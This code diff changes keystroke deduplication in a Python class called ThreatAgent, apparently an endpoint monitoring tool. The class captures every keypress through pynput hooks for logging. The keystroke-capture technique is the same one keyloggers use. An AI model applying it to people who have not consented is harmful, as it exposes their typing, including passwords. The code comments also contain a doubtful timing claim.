@@ -76,12 +76,14 @@ class ThreatAgent:
         self._file_lock = threading.Lock()
         self._browser_lock = threading.Lock()
 
-        # Keystroke dedup: macOS fires up to 4x on_press AND on_release events
-        # per physical keypress. Use monotonic timestamps with a lock to guarantee
-        # only one event per physical keypress gets through.
-        self._key_timestamps = {}  # key_id -> monotonic timestamp of last accepted event
+        # Keystroke dedup: macOS/Linux pynput fires multiple on_press events per
+        # physical keypress. Two-layer dedup under a single lock:
+        #   1) Sequence check: if same key fires again with no other key in between → duplicate
+        #   2) Timestamp check: same key within 150ms → duplicate (catches interleaved duplicates)
         self._key_lock = threading.Lock()
-        self._dedup_window = 0.12  # 120ms — catches all macOS duplicate events (spaced ~30-80ms apart)
+        self._last_accepted_key = None       # key_id of the last accepted keystroke
+        self._last_accepted_time = 0         # monotonic time of the last accepted keystroke
+        self._dedup_window = 0.15            # 150ms timestamp window
 
         # Smart Filtering Data
         self.domains_db = {}
@@ -340,22 +342,20 @@ class ThreatAgent:
     # =============================================
     def on_press(self, key):
         try:
-            # Dedup using monotonic clock under lock.
-            # macOS fires up to 4x on_press AND on_release per physical keypress.
-            # time.monotonic() is immune to system clock adjustments and provides
-            # nanosecond-level precision. Under the lock, only the first event
-            # within the 50ms window gets through.
+            # Dedup: reject same key firing again within 150ms window.
+            # macOS/Linux pynput fires 3-4x on_press per physical keypress,
+            # all within ~100ms. Real repeated keypresses (e.g. "ll") are
+            # >150ms apart even at fast typing speeds.
+            # Different keys are never filtered (fast typists hit different
+            # keys <50ms apart, which is legitimate).
             key_id = str(key)
             now = time.monotonic()
             with self._key_lock:
-                last = self._key_timestamps.get(key_id, 0)
-                if (now - last) < self._dedup_window:
-                    return  # Duplicate — skip
-                self._key_timestamps[key_id] = now
-                # Prune old entries every 50 keys to avoid unbounded growth
-                if len(self._key_timestamps) > 50:
-                    cutoff = now - 1.0
-                    self._key_timestamps = {k: t for k, t in self._key_timestamps.items() if t > cutoff}
+                if key_id == self._last_accepted_key and \
+                   (now - self._last_accepted_time) < self._dedup_window:
+                    return  # Same key within 150ms — OS duplicate, skip
+                self._last_accepted_key = key_id
+                self._last_accepted_time = now
 
             char_to_log = ""
             if hasattr(key, 'char') and key.char is not None:
